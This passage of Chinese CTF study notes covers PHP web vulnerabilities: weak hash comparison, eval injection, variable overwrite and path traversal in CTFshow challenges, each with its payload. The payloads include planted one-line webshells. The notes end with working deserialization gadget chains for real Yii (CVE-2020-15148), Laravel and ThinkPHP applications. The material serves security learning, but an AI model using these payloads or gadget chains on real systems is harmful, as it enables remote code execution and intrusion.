用于构造XSS、绕过哈希比较；\n\nSoapClient() 一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的PHP客户端； 用于利用SSRF；\n\nSimpleXMLElement() 用于解析XML文档中的元素，可用于利用XXE；\n\n\n回溯上限常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）；    DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入；    NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态；\n大多数程序语言都使用NFA作为正则引擎，其中也包括PHP使用的PCRE库；PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit；大概意思就是在php中正则表达式进行匹配有一定的限制，超过限制直接返回false\n短路求值同C语言一样，PHP的逻辑运算也存在短路求值机制：    对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y；    对于“或”（||） 运算： x || y 当x为true时，直接跳过，不执行y；\n举些例子（以下题目均来自CTFshow）&lt;?php    $flag=&quot;&quot;;    $v1=$_GET[&#x27;v1&#x27;];    $v2=$_GET[&#x27;v2&#x27;];    if(isset($v1) &amp;&amp; isset($v2))&#123;        if(!ctype_alpha($v1))&#123;   // v1必须为纯字母            die(&quot;v1 error&quot;);        &#125;        if(!is_numeric($v2))&#123;    // v2为纯数字            die(&quot;v2 error&quot;);        &#125;        if(md5($v1)==md5($v2))&#123;  // 两者MD5相等即可获取flag            echo $flag;        &#125;    &#125;else&#123;                echo &quot;where is flag?&quot;;    &#125;?&gt;考点：MD5弱比较payload:    ?v1=QNKCDZO&amp;v2=240610708\n// ctfshow_群友挑战_我是一个复读机&lt;?phpinclude &quot;flag.php&quot;;highlight_file(__FILE__);error_reporting(0);if (isset($_GET[&quot;YBB&quot;])) &#123;    if (hash(&quot;md5&quot;, $_GET[&quot;YBB&quot;]) == $_GET[&quot;YBB&quot;]) &#123;        echo &quot;小伙子不错嘛！！flag给你了：&quot; . $flag;    &#125; else &#123;        echo &quot;偶吼，带黑阔被窝抓到了！！！！&quot;;    &#125;&#125;考点：MD5弱比较解题思路：    要求YBB参数的md5值与自身的弱比较能够通过，即两者开头均为&#x27;0e&#x27;即可；payload:    ?YBB=0e215962017\n&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;        echo $flag;    &#125;&#125;?&gt;考点：SHA1弱比较payload:    GET部分：?v2=aaO8zKZF    POST部分：v1=aaK1STfY\n&lt;?phpinclude(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt;解题思路：    中间的两行代码没有作用，因为我们不提交flag参数；payload:    GET部分：?HTTP_FLAG=flag    POST部分：HTTP_FLAG=flag\n&lt;?phphighlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt;payload:    GET部分：?n=2.php    POST部分；content=&lt;?php @eval($_POST[a]);?&gt;    GET部分:2.php    POST部分：            a=system(&#x27;ls&#x27;);            a=system(&#x27;tac flag36d.php&#x27;);\n&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;&#125;?&gt;payload:    ?v1=21&amp;v2=var_dump($ctfshow)&amp;v3=;\n&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);  // 判断var是否为数字或数字字符串，是则返回True，否则返回False；if($v0)&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;   &#125;?&gt;考点：逻辑弱比较，敏感字符过滤payload:    ?v1=2333&amp;v2=echo new Reflectionclass&amp;v3=;\n&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;        file_put_contents($v3,$str);    &#125;    else&#123;        die(&#x27;Sorry&#x27;);    &#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;解题思路：    &lt;?=`cat *`;    base64编码-&gt; PD89YGNhdCAqYDs=    Hex编码-&gt; 5044383959474e6864434171594473payload:    GET部分:v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php    POST部分:v1=hex2bin    访问1.php查看源代码即可获取flag；\n&lt;?phphighlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123;    if($key===&#x27;error&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123;    if($value===&#x27;flag&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);?&gt;考点：变量覆盖解题思路：    由代码内容可知：通过GET方法传入的参数名不能为&#x27;error&#x27;，通过POST方法传入的参数值不能为&#x27;flag&#x27;，    所以GET部分只能传入&#x27;$suces&#x27;，POST部分只能传入&#x27;$error&#x27;，    通过变量覆盖，将&#x27;$flag&#x27;的值传给&#x27;$suces&#x27;，再将&#x27;$suces&#x27;的值传给&#x27;$error&#x27;，以此绕过检测；payload:    GET部分:?suces=flag    POST部分:error=suces\n&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;            eval(&quot;echo new $v1($v2());&quot;);    &#125;&#125;?&gt;考点：内置类payload1:    ?v1=Exception&amp;v2=system(&#x27;ls&#x27;)    ?v1=Exception&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)payload2:    ?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)    ?v1=ReflectionClass&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)payload3:    ?v1=ReflectionFunction&amp;v2=system(&#x27;ls&#x27;)    ?v1=ReflectionFunction&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)\n&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;?&gt;解题思路：    使用GLOBALS常量数组绕过词法作用域限制；payload:    ?v1=ctfshow&amp;v2=GLOBALS\n&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;        die(&#x27;hacker!&#x27;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;解题思路1：    /proc/self/root代表根目录，进行目录溢出，超过is_file能处理的最大长度就不认为是个文件了；payload1:    ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php解题思路2：zip伪协议；payload2:    ?file=compress.zlib://flag.php\n&lt;?phpinclude(&#x27;flag.php&#x27;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123;    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;    if($num==&#x27;36&#x27;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;;&#125;解题思路：    trim()函数会去掉num里的%0a, %0b, %0d, %20, %09；    PHP强比较的本质是比较两个字符串，弱比较会把传入的num进行类似于intval()的转化；    is_numeric()：检测是不是数字/数字字符串；这里的%0c是换页符，%09，%20都可以让is_numeric()函数为true；payload:    ?num=%0c36\n&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;解题思路：    在php中，变量名只能由数字、字母、下划线组成，被GET或者POST传入的变量名，如果含有空格、&#x27;+&#x27;、&#x27;[&#x27;等字符，就会被转化为&#x27;_&#x27;；    php中有个特性：如果传入&#x27;[&#x27;，它被转化为&#x27;_&#x27;之后，后面的字符就会被保留下来不会被替换；payload1:    CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flagpayload2:    CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fl0g=flag_give_me&amp;fun=extract($_POST)\n&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);         if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;解题思路：    在上一题的基础上增加了关键词过滤，echo失效；    使用extract()函数，将&#x27;POST&#x27;里面的元素转化为变量，实现对&#x27;fl0g&#x27;的赋值；payload:    CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fl0g=flag_give_me&amp;fun=extract($_POST)\n&lt;?phperror_reporting(0);highlight_file(__FILE__);$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];function CTFSHOW_36_D($a,$b)&#123;    $dis = array(&quot;var_dump&quot;,&quot;exec&quot;,&quot;readfile&quot;,&quot;highlight_file&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;,&quot;&quot;);    $a = strtolower($a);    if (!in_array($a,$dis,true)) &#123;        forward_static_call_array($a,$b);    &#125;else&#123;        echo &#x27;hacker&#x27;;    &#125;&#125;CTFSHOW_36_D($a,$b);echo &quot;rlezphp!!!&quot;;解题思路：    通过绝对路径调用函数；payload:    ?a=\\system&amp;b[]=ls;    ?a=\\system&amp;b[]=tac flag.php;\n&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;解题思路：    $_SERVER[&#x27;argv&#x27;][0]是脚本名    assert()函数用于执行字符串中的PHP代码payload:    GET部分：        ?$fl0g=flag_give_me    POST部分：        CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])\n&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123;    $f = $_GET[&#x27;f&#x27;];    if(stripos($f, &#x27;ctfshow&#x27;) &gt; 0)&#123;        echo readfile($f);    &#125;&#125;考点：目录穿越解题思路：    stripos()函数用于查找字符串在另一字符串中第一次出现的位置（不区分大小写）；    题目要求stripos($f, &#x27;ctfshow&#x27;)，也就是ctfshow在变量f中出现的第一个位置，此时需要构建一个目录，让ctfshow自行索引查找;payload:    ?f=/ctfshow/../../../var/www/html/flag.php\n&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123;    $f = $_POST[&#x27;f&#x27;];    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;&#125;解题思路：    要想得到flag，首先必须正则匹配为false；    &quot;/.+?ctfshow/is&quot;后面的i表示大小写匹配，s表示忽略换行符，单行匹配；;    在不加转义字符的前提下，前面的点表示任意字符，而&quot;+?&quot;表示非贪婪匹配，即前面的字符至少出现一次；    所以，该正则匹配的意思为：ctfshow前面如果出现任意字符，即匹配准确；    再根据下面的stripos为字符串匹配函数，要求输入的参数必须有&quot;ctfshow&quot;字符，所以输入的参数只需要满足ctfshow前面不加任意字符即可；payload:    f=ctfshow\n&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123;    $f = (String)$_POST[&#x27;f&#x27;];    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;&#125;考点：正则表达式溢出PoC:&lt;?php    echo &quot;f=&quot;.str_repeat(&quot;very&quot;, 250000).&quot;36Dctfshow&quot;;?&gt;// payload过长，不宜展示\n&lt;?php#error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;    $username = (String)$_GET[&#x27;username&#x27;];    $password = (String)$_GET[&#x27;password&#x27;];    $code = (String)$_GET[&#x27;code&#x27;];    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;                if($code == &#x27;admin&#x27;)&#123;            echo $flag;        &#125;            &#125;&#125;考点：短路求值payload:    ?username=admin&amp;password=admin&amp;code=admin\n&lt;?phphighlight_file(__FILE__);error_reporting(2);extract($_GET);ini_set($name,$value);system(    &quot;ls &#x27;&quot;.filter($_GET[1]).&quot;&#x27;&quot;);function filter($cmd)&#123;    $cmd = str_replace(&quot;&#x27;&quot;,&quot;&quot;,$cmd);    $cmd = str_replace(&quot;\\\\&quot;,&quot;&quot;,$cmd);    $cmd = str_replace(&quot;`&quot;,&quot;&quot;,$cmd);    $cmd = str_replace(&quot;$&quot;,&quot;&quot;,$cmd);    return $cmd;&#125;解题思路：    将一句话木马写入报错信息，执行错误日志；payload:    ?name=error_log&amp;value=/var/www/html/1.php&amp;1=%00&lt;?php%20system(&quot;tac /flag&quot;);?&gt;\n&lt;?phphighlight_file(__FILE__);$key1 = 0;$key2 = 0;if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;    die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);extract($_POST);if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;    die(file_get_contents(&#x27;flag.php&#x27;));&#125;考点：变量覆盖解题思路：    先将GET方法请求解析成变量，然后再利用extract()函数将变量从数组中导入到当前的符号表；payload:    ?_POST[key1]=36d&amp;_POST[key2]=36d\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;    die(&quot;private function&quot;);&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]);考点：函数调用、POST数组特性解题思路：    过滤了&#x27;:&#x27;，根据call_user_func()的函数用法将参数按序传入POST数组中即可；payload:    ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag\n\nPHP反序列化什么是序列化与反序列化？为了解决PHP对象传递的问题，即PHP文件在执行结束以后就会将对象销毁，人们决定使用序列化方式将对象转换成可传输格式（字节流）；与之相应的是反序列化：将字节流恢复成对象，即从存储中读取数据并重新创建对象；在PHP应用中，序列化和反序列化一般用作缓存，比如session缓存、cookie缓存等，其目的是为了方便数据的传输和存储；\n操作函数\nserialize() 将对象中的成员变量转换成字符串（序列化）;\nunserialize() 将序列化字符串还原为对象中的成员变量（反序列化）；\n\n输出格式：\nO:类名长度:&quot;类名&quot;:变量数:&#123;变量1的类型:变量名1长度:&quot;变量名1&quot;;变量1的类型:变量1值长度:&quot;变量1的值&quot;;变量2的类型:变量名2长度:&quot;变量名2&quot;;变量2的类型:变量2值长度:&quot;变量2的值&quot;;……;变量n的类型:变量名n长度:&quot;变量名n&quot;;变量n的类型:变量n值长度:&quot;变量n的值&quot;;&#125;\n其中’O’代表类；其他类型：s代表字符串，i代表整型，f代表浮点型，b代表布尔类型；\n对象区别：\n\nprivate输出格式：%00类名%00成员名；\nprotected输出格式：%00*%00成员名；\n\n常用芝士学习下面的芝士之前，你要先学会构造PoC，这部分手动构造payload会S人的；这里提供一个基本的PoC模板：\n&lt;?phpclass Test&#123;    public $a = &#x27;ThisA&#x27;;      // 公有变量    protected $b = &#x27;ThisB&#x27;;  // 保护变量    private $c = &#x27;ThisC&#x27;;   // 私有变量    public function test1()    &#123;        return &quot;this is test1&quot;;    &#125;&#125;$test = new Test();$sTest = serialize($test);  // 序列化$usTest = unserialize($sTest);  // 反序列化var_dump($usTest);?&gt;\n输出结果：object(Test)[2]public &#x27;a&#x27; =&gt; string &#x27;ThisA&#x27; (length=5)protected &#x27;b&#x27; =&gt; string &#x27;ThisB&#x27; (length=5)private &#x27;c&#x27; =&gt; string &#x27;ThisC&#x27; (length=5)\n可见，类的各个成员变量都被还原了，但是类的方法没有被还原，因为执行序列化的时候不保存类的方法；此外，在传入序列化字符串之前需要进行一次url编码，因为字符串上传到服务器之后会自动执行一次url解码；\n魔术方法一些常用的PHP自动调用方法：\n__construct()：__destruct()：__invoke()：__tostring()：__wakeup()：__sleep()：__call()：__callStatic()：__get()：__set()：__isset()：__unset()：\n字符串逃逸Yii反序列化漏洞Yii2.0.38 之前的版本存在反序列化漏洞，其CVE编号是CVE-2020-15148：程序在调用unserialize()时，攻击者可通过构造特定的恶意请求执行任意命令；2.0.38已修复，官方给yii\\db\\BatchQueryResult类加了一个__wakeup()函数，__wakeup方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当BatchQueryResult类被反序列化时就直接报错，避免反序列化的发生，也就避免了漏洞；\n一些Pop链&lt;?phpnamespace yii\\rest&#123;    class IndexAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess = &#x27;phpinfo&#x27;;            $this-&gt;id = &#x27;1&#x27;;\t\t\t\t//命令执行        &#125;    &#125;&#125;namespace Faker &#123;    use yii\\rest\\IndexAction;    class Generator    &#123;        protected $formatters;        public function __construct()        &#123;            $this-&gt;formatters[&#x27;close&#x27;] = [new IndexAction(), &#x27;run&#x27;];        &#125;    &#125;&#125;namespace yii\\db&#123;    use Faker\\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()        &#123;            $this-&gt;_dataReader=new Generator();        &#125;    &#125;&#125;namespace&#123;    use yii\\db\\BatchQueryResult;    echo base64_encode(serialize(new BatchQueryResult()));&#125;\nLaravel反序列化漏洞一些Pop链&lt;?phpnamespace Illuminate\\Broadcasting&#123;    use Illuminate\\Bus\\Dispatcher;    use Illuminate\\Foundation\\Console\\QueuedCommand;    class PendingBroadcast    &#123;        protected $events;        protected $event;        public function __construct()&#123;            $this-&gt;events=new Dispatcher();            $this-&gt;event=new QueuedCommand();        &#125;    &#125;&#125;namespace Illuminate\\Foundation\\Console&#123;    use Mockery\\Generator\\MockDefinition;    class QueuedCommand    &#123;        public $connection;        public function __construct()&#123;            $this-&gt;connection=new MockDefinition();        &#125;    &#125;&#125;namespace Illuminate\\Bus&#123;    use Mockery\\Loader\\EvalLoader;    class Dispatcher    &#123;        protected $queueResolver;        public function __construct()&#123;            $this-&gt;queueResolver=[new EvalLoader(),&#x27;load&#x27;];        &#125;    &#125;&#125;namespace Mockery\\Loader&#123;    class EvalLoader    &#123;    &#125;&#125;namespace Mockery\\Generator&#123;    class MockConfiguration    &#123;        protected $name=&quot;feng&quot;;    &#125;    class MockDefinition    &#123;        protected $config;        protected $code;        public function __construct()        &#123;            $this-&gt;code=&quot;&lt;?php system(&#x27;cat /flag&#x27;);exit()?&gt;&quot;;            $this-&gt;config=new MockConfiguration();        &#125;    &#125;&#125;namespace&#123;    use Illuminate\\Broadcasting\\PendingBroadcast;    echo urlencode(serialize(new PendingBroadcast()));&#125;\n\nThinkPHP反序列化漏洞一些Pop链&lt;?phpnamespace think;abstract class Model&#123;    protected $append = [];    private $data = [];    function __construct()&#123;        $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];        $this-&gt;data = [&quot;lin&quot;=&gt;new Request()];    &#125;&#125;class Request&#123;    protected $hook = [];    protected $filter = &quot;system&quot;; //PHP函数    protected $config = [        // 表单ajax伪装变量        &#x27;var_ajax&#x27;         =&gt; &#x27;_ajax&#x27;,      ];    function __construct()&#123;        $this-&gt;filter = &quot;system&quot;;        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;]; //PHP函数的参数        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];    &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123;    private $files = [];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));?&gt;\n\npickle反序列化漏洞举些例子（以下题目均来自CTFshow）&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    // Cookie传入变量&#x27;user&#x27;进行反序列化    if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;解题思路：    GET传入变量的同时，需要将&#x27;isVip&#x27;的值从false变成true；    将类ctfShowUser和变量isVip序列化，再修改isVip的值，通过Cookie传入；payload1:    GET部分：?username=xxxxxx&amp;password=xxxxxx    COOKIE部分：user=O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&#x27;username&#x27;;s:6:&#x27;xxxxxx&#x27;;s:8:&#x27;password&#x27;;s:6:&#x27;xxxxxx&#x27;;s:5:&quot;isVip&quot;;b:1;&#125;    